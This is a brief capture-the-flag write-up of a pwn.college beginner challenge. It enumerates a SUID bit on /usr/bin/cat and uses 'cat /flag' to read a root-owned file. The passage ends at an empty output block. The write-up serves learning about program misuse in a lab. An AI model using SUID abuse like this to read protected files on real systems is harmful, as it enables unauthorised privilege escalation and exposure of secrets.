# Challenge Name: cat
**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/cat`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/cat
```

output:
```
-rwsr-xr-x 1 root root 43416 Sep  5  2019 /usr/bin/cat
```

-The `s` in `-rws` indicates it's a SUID binary.
-`cat` runs with **root privileges**.

## 🚀 Exploitation

We simply use `cat` to read the flag:

```bash
cat /flag
```
Output:
```
